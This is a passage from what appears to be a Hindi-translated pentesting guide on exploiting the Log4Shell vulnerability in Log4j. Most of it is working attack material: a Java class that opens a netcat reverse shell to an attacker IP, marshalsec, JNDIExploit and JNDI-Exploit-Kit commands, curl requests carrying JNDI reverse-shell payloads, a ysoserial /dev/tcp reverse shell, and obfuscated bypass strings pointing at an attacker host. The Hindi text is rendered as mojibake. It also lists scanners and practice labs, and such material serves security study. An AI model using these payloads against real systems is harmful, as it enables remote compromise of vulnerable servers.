рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдо рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдЙрд╕ рдХреЛрдб рдХреЛ рд▓реЛрдб рдХрд░реЗ рдЬреЛ рд╣рдореЗрдВ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬреЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде Exploit.java рдирд╛рдордХ рдПрдХ рдЬрд╛рд╡рд╛ рдлрд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

**class file** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрди рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ: `javac Exploit.java -source 8 -target 8` рдФрд░ рдлрд┐рд░ рдЙрд╕реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ **HTTP рд╕рд░реНрд╡рд░** рдЪрд▓рд╛рдПрдВ рдЬрд╣рд╛рдВ class file рдмрдирд╛рдИ рдЧрдИ рдереА: `python3 -m http.server`.\
**marshalsec рдХрд╛ LDAP рд╕рд░реНрд╡рд░ рдЗрд╕ HTTP рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**.\
рдлрд┐рд░, рдЖрдк **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ exploit class рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ payload рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЬрд╛рд╡рд╛ рдХреЛ LDAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрд╕реНрдЯрдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред рдРрд╕реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдкрдХреЛ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

### RCE - **JNDIExploit**

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рд▓реЗрдЦрдХ рдиреЗ log4shell рдХреА рдЦреЛрдЬ рдХреЗ рдмрд╛рдж рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ github рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ред рдЖрдк рдЗрд╕рдХрд╛ рдХреИрд╢реНрдб рд╕рдВрд╕реНрдХрд░рдг [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд▓реЗрдЦрдХ рдХреЗ рдирд┐рд░реНрдгрдп рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЗрд╕ рд╡рд▓реНрди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ рддрд░реАрдХрд╛ рдЕрдкрдирд╛рдПрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк wayback machine рдореЗрдВ рд╕реЛрд░реНрд╕ рдХреЛрдб рдирд╣реАрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╛ рддреЛ рд╕реЛрд░реНрд╕ рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ, рдпрд╛ рдЬрд╛рд░ рдлрд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдпрд╣ рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдЖрдк рдирд╣реАрдВ рдЬрд╛рдирддреЗ рдХрд┐ рдЖрдк рдХреНрдпрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред
{% endhint %}

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдЗрд╕ **vulnerable web server to log4shell** рдХреЛ рдкреЛрд░реНрдЯ 8080 рдкрд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_README рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдорд┐рд▓реЗрдЧрд╛_)ред рдпрд╣ рд╡рд▓реНрдирд░реЗрдмрд▓ рдРрдк HTTP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╣реЗрдбрд░ _X-Api-Version_ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рд╡рд▓реНрдирд░реЗрдмрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ log4shell рдХреЗ рд╕рд╛рде рд▓реЙрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред

рдлрд┐рд░, рдЖрдк **JNDIExploit** рдЬрд╛рд░ рдлрд╛рдЗрд▓ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
рдХреЛрдб рдХреЛ рдХреБрдЫ рд╣реА рдорд┐рдирдЯреЛрдВ рдореЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рдмрд╛рдж, _com.feihong.ldap.LdapServer_ рдФрд░ _com.feihong.ldap.HTTPServer_ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **LDAP рдФрд░ HTTP рд╕рд░реНрд╡рд░ рдХреИрд╕реЗ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред LDAP рд╕рд░реНрд╡рд░ рд╕рдордЭреЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕рд╛ рдкреЗрд▓реЛрдб рд╕реЗрд╡рд╛ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ рдФрд░ рдпрд╣ рдкреАрдбрд╝рд┐рдд рдХреЛ HTTP рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдЧрд╛, рдЬреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реЗрд╡рд╛ рдХрд░реЗрдЧрд╛ред
_com.feihong.ldap.gadgets_ рдореЗрдВ рдЖрдк **рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЧреИрдЬреЗрдЯреНрд╕** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд╛рдВрдЫрд┐рдд рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рд╕рдВрднрд╡рддрдГ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)ред рдФрд░ _com.feihong.ldap.template_ рдореЗрдВ рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреНрд▓рд╛рд╕реЗрд╕ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдЬрдирд░реЗрдЯ рдХрд░реЗрдВрдЧреЗ**ред

рд╕рднреА рдЙрдкрд▓рдмреНрдз рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХреЛ рдЖрдк **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** рдХреЗ рд╕рд╛рде рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдХреБрдЫ рдЙрдкрдпреЛрдЧреА рд╡рд╛рд▓реЗ рд╣реИрдВ:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
рддреЛ, рд╣рдорд╛рд░реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╡рд╣ рдбреЙрдХрд░ рд╡рд▓реНрдирд░реЗрдмрд▓ рдРрдк рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдЗрд╕ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
рд╣рдорд▓реЗ рднреЗрдЬрддреЗ рд╕рдордп рдЖрдкрдХреЛ рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ рдЬрд╣рд╛рдБ рдЖрдкрдиреЗ **JNDIExploit-1.2-SNAPSHOT.jar** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдерд╛ред

**рдЕрдиреНрдп рд╢реЛрд╖рдг рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд▓рд┐рдП `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛ рди рднреВрд▓реЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдХреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ, рддреЛ рдЖрдк LDAP рдФрд░ HTTP рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдкреЛрд░реНрдЯ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

рдкрд┐рдЫрд▓реЗ рд╢реЛрд╖рдг рдХреА рддрд░рд╣, рдЖрдк [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП URLs рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_рдпрд╣ рд╣рдорд▓рд╛ рдПрдХ рдХрд╕реНрдЯрдо рдЬрдирд░реЗрдЯреЗрдб рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **THM рд╕реЛрд▓рд░ рд░реВрдо** рдЬреИрд╕реА рд▓реИрдмреНрд╕ рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рдХреНрдпреЛрдВрдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЬрд╛рд╡рд╛ LDAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХрд┐рд╕реА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред_

### RCE - ysoserial & JNDI-Exploit-Kit

рдпрд╣ рд╡рд┐рдХрд▓реНрдк **рдХреЗрд╡рд▓ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреНрд▓рд╛рд╕реЛрдВ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдЬрд╛рд╡рд╛ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИред рдЗрд╕рд▓рд┐рдП, **ysoserial** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕реЛрдВ рдХреЗ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** рдЬрдирд░реЗрдЯ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреИрдЬреЗрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (_ysoserial рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреАрдбрд╝рд┐рдд рдЬрд╛рд╡рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдХрд░реЗ_)ред

**ysoserial** рдпрд╛ [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ JNDI рджреНрд╡рд╛рд░рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) рдХрд╛ рдЙрдкрдпреЛрдЧ **JNDI рд▓рд┐рдВрдХреНрд╕** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрдордЬреЛрд░ рдорд╢реАрдиреЛрдВ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдЧрд╛ред рдЖрдк **рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЬреЛ рдХрд┐ JNDI-Exploit-Kit рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рд╕рд░реНрд╡рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЕрдкрдиреЗ **рд╕реНрд╡рдпрдВ рдХреЗ deserialization payloads** (рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдпрд╛ ysoserial рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди) рднреАред
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

рдЕрдм рдЖрдк рдПрдХ рдЙрддреНрдкрдиреНрди JNDI рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ **reverse shell** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╕ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ log4j рдХреЛ рднреЗрдЬрдХрд░: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:─▒}}:ldap://...} //Notice the unicode "i"
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕реНрдХреИрдирд░

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - рд╕реНрдерд╛рдиреАрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ

### рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рд▓реИрдмреНрд╕

* [**LogForge HTB рдорд╢реАрди**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar рдХрдХреНрд╖**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell рд╢реЛрд╖рдг

рдЗрд╕ [**CTF рд▓реЗрдЦрди**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) рдореЗрдВ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ **Log4J** рдХреА рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

Log4j рдХреЗ [**рд╕реБрд░рдХреНрд╖рд╛ рдкреГрд╖реНрда**](https://logging.apache.org/log4j/2.x/security.html) рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд╛рдХреНрдп рд╣реИрдВ:

> рд╕рдВрд╕реНрдХрд░рдг 2.16.0 (рдЬрд╛рд╡рд╛ 8 рдХреЗ рд▓рд┐рдП), **рд╕рдВрджреЗрд╢ рд▓реБрдХрдЕрдк рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓реБрдХрдЕрдк рдЕрднреА рднреА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, Log4j рдЕрдм рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JNDI рддрдХ рдкрд╣реБрдБрдЪ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрддрд╛ рд╣реИред рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ JNDI рд▓реБрдХрдЕрдк рдХреЛ рдЕрдм рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

> рд╕рдВрд╕реНрдХрд░рдг 2.17.0 рд╕реЗ, (рдФрд░ 2.12.3 рдФрд░ 2.3.1 рдЬрд╛рд╡рд╛ 7 рдФрд░ рдЬрд╛рд╡рд╛ 6 рдХреЗ рд▓рд┐рдП), **рдХреЗрд╡рд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓реБрдХрдЕрдк рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХрд╛ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╕реЗ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**; рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧ рдореЗрдВ, рдХреЗрд╡рд▓ рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рд▓реБрдХрдЕрдк рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХрд┐рд╕реА рднреА рдиреЗрд╕реНрдЯреЗрдб рд▓реБрдХрдЕрдк рдХреЛ рд╣рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк рдХрд┐рд╕реА рднреА `jndi` рд╢реЛрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ **рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд▓реБрдХрдЕрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрд╕ CTF рдореЗрдВ рдпрд╣ log4j2.xml рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

